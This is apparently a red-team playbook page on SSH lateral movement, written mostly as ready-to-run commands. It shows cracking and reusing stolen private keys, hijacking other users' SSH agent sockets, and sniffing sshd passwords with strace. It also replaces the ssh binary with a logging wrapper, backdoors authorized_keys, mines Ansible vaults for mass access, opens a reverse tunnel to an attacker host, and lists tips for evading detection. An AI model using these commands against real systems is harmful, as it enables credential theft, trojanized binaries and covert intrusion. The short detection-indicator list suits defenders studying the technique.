# SSH Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1021.004 - Remote Services: SSH
> **Platforms**: Linux, macOS, Windows (OpenSSH)
> **Required Privileges**: Valid SSH credentials or private keys
> **OPSEC Risk**: Low

## Strategic Overview

SSH is the primary remote access protocol in Linux/Unix environments and is increasingly present on Windows systems via OpenSSH. SSH lateral movement is among the lowest-OPSEC techniques because SSH connections are expected infrastructure traffic in virtually every environment. Unlike Windows lateral movement, where multiple protocols compete (SMB, WMI, WinRM, DCOM), in Linux environments SSH is the dominant and often sole remote management protocol. This makes attacker SSH sessions nearly indistinguishable from legitimate admin activity. The key attack vectors are credential reuse (password or private key), SSH agent forwarding hijacking, and SSH configuration abuse. A red team lead operating in Linux-heavy environments must master SSH pivoting techniques -- ProxyJump, SOCKS tunneling, and port forwarding -- to traverse segmented networks without deploying additional tooling.

### Linux Lateral Movement Landscape

SSH dominates, but also consider:
- Ansible/Puppet/Chef automation credentials (often SSH-based)
- Container orchestration (kubectl, Docker socket)
- Cloud metadata service abuse (IMDS)
- Database connections with reused credentials
- NFS/NIS trust relationships in legacy environments

## Technical Deep-Dive

### 1. SSH Key Discovery and Reuse

```bash
# Search for SSH private keys on compromised host
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null

# Common key locations
ls -la ~/.ssh/
ls -la /home/*/.ssh/
ls -la /root/.ssh/
ls -la /etc/ssh/ssh_host_*  # Host keys (rarely useful for lateral movement)

# Check for passphrase-less keys (key starts with BEGIN but no ENCRYPTED header)
head -5 /home/user/.ssh/id_rsa
# If it shows "-----BEGIN RSA PRIVATE KEY-----" without "ENCRYPTED", no passphrase

# Crack SSH key passphrases with John
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Use discovered key to connect to other hosts
chmod 600 stolen_key
ssh -i stolen_key user@target

# Discover potential targets from known_hosts
cat ~/.ssh/known_hosts  # Shows hashed or unhashed hostnames/IPs of previously connected hosts
# Unhashed known_hosts reveals target inventory directly

# Discover targets from SSH config
cat ~/.ssh/config  # May reveal hostnames, users, jump hosts, key paths
cat /etc/ssh/ssh_config

# Check authorized_keys for clues about who connects to this host
cat ~/.ssh/authorized_keys  # May contain user@hostname comments revealing source systems
```

### 2. SSH Agent Forwarding Hijacking

```bash
# If a user has SSH agent forwarding enabled (ssh -A), their agent socket
# is accessible on the remote host. A root user can hijack any user's agent.

# Find active SSH agent sockets
find /tmp -name "agent.*" -type s 2>/dev/null
ls -la /tmp/ssh-*/

# Identify which user owns which socket
ls -la /tmp/ssh-*/agent.*

# Hijack the agent (requires root or same-user access)
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXX/agent.12345

# List keys available through the hijacked agent
ssh-add -l

# Use the hijacked agent to SSH to other hosts as the victim
ssh user@another_target  # Uses victim's keys transparently

# Automate agent socket discovery
for sock in /tmp/ssh-*/agent.*; do
    export SSH_AUTH_SOCK=$sock
    echo "=== Socket: $sock ==="
    ssh-add -l 2>/dev/null
done
```

### 3. SSH Tunneling for Pivoting

```bash
# Local port forward -- access remote_target:3389 through compromised host
ssh -L 13389:remote_target:3389 user@compromised_host
# Now connect to localhost:13389 to reach remote_target:3389

# Remote port forward -- make your attacker service accessible via compromised host
ssh -R 8080:localhost:80 user@compromised_host
# Now compromised_host:8080 reaches your attacker's port 80

# Dynamic SOCKS proxy -- full SOCKS4/5 proxy through the SSH connection
ssh -D 1080 user@compromised_host
# Configure tools to use SOCKS proxy at 127.0.0.1:1080
proxychains nmap -sT -p 80,443,445,3389 internal_network/24

# ProxyJump -- SSH through a jump host (cleaner than nested SSH)
ssh -J user@jumphost user@internal_target
# Equivalent to: ssh -o ProxyCommand="ssh -W %h:%p user@jumphost" user@internal_target

# Multi-hop ProxyJump
ssh -J user@hop1,user@hop2 user@final_target

# Background tunnel (no interactive shell, just the tunnel)
ssh -f -N -D 1080 user@compromised_host
ssh -f -N -L 13389:target:3389 user@compromised_host
```

### 4. SSH Credential Harvesting

```bash
# Monitor SSH connections for passwords (requires root)
# Method 1: strace on sshd
strace -p $(pgrep -f "sshd:.*password") -e read -o /tmp/.ssh_capture 2>/dev/null &

# Method 2: PAM module injection (persistent credential capture)
# Replace or modify pam_unix.so to log passwords

# Method 3: SSH wrapper script (replace ssh binary)
mv /usr/bin/ssh /usr/bin/ssh.orig
cat > /usr/bin/ssh << 'WRAPPER'
#!/bin/bash
echo "$(date) $@" >> /tmp/.ssh_log
/usr/bin/ssh.orig "$@"
WRAPPER
chmod +x /usr/bin/ssh

# Method 4: Backdoor authorized_keys with command logging
# In authorized_keys, prepend:
# command="/usr/bin/logger -t ssh_auth $SSH_ORIGINAL_COMMAND; $SSH_ORIGINAL_COMMAND" ssh-rsa AAAA...

# Harvest from bash history
grep -i "ssh\|scp\|sftp" ~/.bash_history /home/*/.bash_history 2>/dev/null
grep -i "sshpass" ~/.bash_history /home/*/.bash_history 2>/dev/null

# Check for stored credentials in scripts
grep -r "ssh\|sshpass\|id_rsa\|StrictHostKeyChecking" /opt/ /srv/ /var/www/ /home/ 2>/dev/null
```

### 5. Ansible / Automation Credential Reuse

```bash
# Ansible typically uses SSH and stores inventory/credentials in predictable locations
find / -name "ansible.cfg" -o -name "inventory" -o -name "hosts" 2>/dev/null
find / -name "*.yml" -path "*/ansible/*" 2>/dev/null
find / -name "vault*" -path "*/ansible/*" 2>/dev/null

# Check ansible configuration for SSH keys and privilege escalation
cat /etc/ansible/ansible.cfg
cat /etc/ansible/hosts  # Inventory with hostnames, users, SSH keys

# Ansible vault passwords
cat ~/.ansible/vault_pass
# Decrypt ansible vault: ansible-vault decrypt secrets.yml --vault-password-file vault_pass

# Use ansible ad-hoc commands for mass lateral movement
ansible all -i inventory -m shell -a "id" --become

# Check for SSH keys referenced in automation configs
grep -r "ansible_ssh_private_key_file\|private_key\|ssh_key" /etc/ansible/ /opt/ansible/ 2>/dev/null
```

### 6. SSH on Windows (OpenSSH)

```powershell
# Modern Windows includes OpenSSH client and optionally the server
# Check for OpenSSH installation
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

# Find SSH keys on Windows
dir C:\Users\*\.ssh\ /s
dir C:\ProgramData\ssh\

# SSH from Windows to Linux targets
ssh -i C:\Users\admin\.ssh\id_rsa user@linux_target

# Windows OpenSSH server authorized_keys location
# For regular users: C:\Users\<username>\.ssh\authorized_keys
# For administrators: C:\ProgramData\ssh\administrators_authorized_keys
```

### 7. Advanced SSH Techniques

```bash
# SSH connection multiplexing (reuse existing connections for faster access)
# In ~/.ssh/config:
# Host *
#   ControlMaster auto
#   ControlPath /tmp/ssh-%r@%h:%p
#   ControlPersist 600

# SSH escape sequences (within an active SSH session)
# ~C  -- Open command line for port forwarding (add -L/-R/-D on the fly)
# ~#  -- List forwarded connections
# ~.  -- Terminate session

# Reverse tunnel for callback access
# On compromised host:
ssh -f -N -R 2222:localhost:22 attacker@attacker_ip
# On attacker: ssh -p 2222 user@localhost  (connects back to compromised host)
```

## Detection & Evasion

### Detection Indicators

- **auth.log / secure** -- SSH authentication events (successful and failed)
- Unusual SSH key usage patterns (key fingerprint not associated with expected user)
- SSH connections from/to unexpected hosts or at unusual times
- Multiple SSH sessions opened in rapid succession across many hosts
- SSH agent forwarding detected in connection logs
- New entries in authorized_keys files
- SSH tunneling indicators: long-duration connections with high throughput, SOCKS proxy traffic patterns

### Evasion Techniques

- SSH is legitimate admin traffic -- connections from admin workstations rarely trigger alerts
- Use ed25519 keys (modern, expected) rather than RSA if generating new keys
- Match connection timing to normal admin patterns
- Use ProxyJump instead of nested SSH sessions for cleaner log trails
- Avoid adding SSH keys to authorized_keys when possible (use stolen existing keys)
- SSH traffic is encrypted end-to-end -- content inspection is not possible without MITM
- Use `ControlMaster` multiplexing to reduce the number of new authentication events

## Cross-References

- [[cloud-lateral]] - SSH to cloud instances via SSM, EC2 Instance Connect
- Section 06: Credential Access - SSH key and credential harvesting
- Section 07: Persistence - SSH backdoor techniques (authorized_keys, SSH server config)
- Section 12: Pivoting and Tunneling - SSH as a primary pivoting mechanism
- Section 03: Linux Post-Exploitation - Credential discovery on Linux hosts

## References

- https://attack.mitre.org/techniques/T1021/004/
- https://www.thehacker.recipes/infra/protocols/ssh
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
- https://www.openssh.com/manual.html
- https://posts.specterops.io/ssh-agent-hijacking-for-lateral-movement-b9e9fb3e2b6b
